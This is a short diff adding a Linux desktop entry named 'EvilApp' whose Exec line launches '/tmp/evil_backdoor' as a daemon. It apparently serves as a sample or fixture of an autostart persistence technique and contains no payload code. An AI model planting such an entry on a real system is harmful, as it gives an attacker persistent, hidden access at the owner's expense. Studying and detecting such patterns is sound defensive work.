@@ -1,0 +1,4 @@
+[Desktop Entry]
+Type=Application
+Name=EvilApp
+Exec=/tmp/evil_backdoor --daemon
